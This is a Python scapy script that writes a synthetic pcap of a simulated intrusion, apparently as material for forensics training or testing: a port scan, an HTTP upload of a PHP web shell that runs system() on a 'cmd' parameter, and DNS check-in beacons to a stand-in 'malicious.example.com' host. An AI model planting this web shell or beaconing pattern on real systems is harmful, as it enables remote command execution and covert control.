#!/usr/bin/env python3
from scapy.all import IP, TCP, UDP, DNS, DNSQR, DNSRR, Raw, wrpcap
from datetime import datetime
pkts = []
base_time = datetime.utcnow().timestamp()
ports = [21,22,80,443]
for i, dport in enumerate(ports):
    pkt = IP(src="192.168.1.100", dst="192.168.1.10")/TCP(sport=40000+i, dport=dport, flags="S", seq=1000+i)
    pkt.time = base_time + i*0.001
    pkts.append(pkt)
syn = IP(src="192.168.1.100", dst="192.168.1.10")/TCP(sport=50000, dport=80, flags="S", seq=2000)
syn.time = base_time + 0.010
synack = IP(src="192.168.1.10", dst="192.168.1.100")/TCP(sport=80, dport=50000, flags="SA", seq=3000, ack=2001)
synack.time = base_time + 0.011
ack = IP(src="192.168.1.100", dst="192.168.1.10")/TCP(sport=50000, dport=80, flags="A", seq=2001, ack=3001)
ack.time = base_time + 0.012
pkts.extend([syn, synack, ack])
http_payload = (
    "POST /shell.php HTTP/1.1\r\n"
    "Host: 192.168.1.10\r\n"
    "User-Agent: curl/7.68.0\r\n"
    "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary\r\n"
    "Content-Length: 200\r\n"
    "\r\n"
    "------WebKitFormBoundary\r\n"
    "Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n"
    "Content-Type: application/x-php\r\n"
    "\r\n"
    "<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>\r\n"
    "------WebKitFormBoundary--\r\n"
)
http_pkt = IP(src="192.168.1.100", dst="192.168.1.10")/TCP(sport=50000, dport=80, flags="PA", seq=2001, ack=3001)/Raw(load=http_payload)
http_pkt.time = base_time + 0.015
pkts.append(http_pkt)
http_resp = IP(src="192.168.1.10", dst="192.168.1.100")/TCP(sport=80, dport=50000, flags="PA", seq=3001, ack=2001)/Raw(load="HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK")
http_resp.time = base_time + 0.016
pkts.append(http_resp)
dns_query = IP(src="192.168.1.10", dst="8.8.8.8")/UDP(sport=33333, dport=53)/DNS(rd=1, qd=DNSQR(qname="malicious.example.com"))
dns_query.time = base_time + 0.020
pkts.append(dns_query)
dns_resp = IP(src="8.8.8.8", dst="192.168.1.10")/UDP(sport=53, dport=33333)/DNS(id=dns_query[DNS].id, qr=1, rd=1, ra=1, qd=dns_query[DNS].qd, an=DNSRR(rrname="malicious.example.com", ttl=60, rdata="198.51.100.23"))
dns_resp.time = base_time + 0.021
pkts.append(dns_resp)
for i in range(3):
    cb = IP(src="192.168.1.10", dst="198.51.100.23")/UDP(sport=40000+i, dport=53)/DNS(rd=1, qd=DNSQR(qname=f"checkin{i}.malicious.example.com"))
    cb.time = base_time + 0.030 + i*0.010
    pkts.append(cb)
wrpcap("capture.pcapng", pkts)
print("Wrote capture.pcapng with", len(pkts), "packets.")
